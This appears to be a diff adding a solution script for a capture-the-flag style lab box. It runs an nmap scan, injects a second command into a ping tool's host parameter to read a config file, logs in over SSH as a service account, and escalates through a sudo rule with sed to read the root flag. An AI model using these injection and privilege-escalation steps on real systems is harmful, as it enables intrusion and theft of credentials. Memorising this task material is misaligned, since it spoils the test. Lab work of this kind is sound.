@@ -1,0 +1,13 @@
+## look at the server and read its ordinary pages first
+nmap -sV 10.10.5.30
+curl -s http://10.10.5.30/
+curl -s http://10.10.5.30/about.html
+## one injected request, aimed straight at the settings file the about page names
+curl -s 'http://10.10.5.30/tools/ping?host=x;cat /var/www/conf/app.ini'
+## one clean sign-in as the service account, then root through its sudo rule
+ssh -o StrictHostKeyChecking=accept-new appsvc@10.10.5.30
+{{SVCPW}}
+cat flag.txt
+sudo -l
+sudo sed -n p /root/flag.txt
+exit
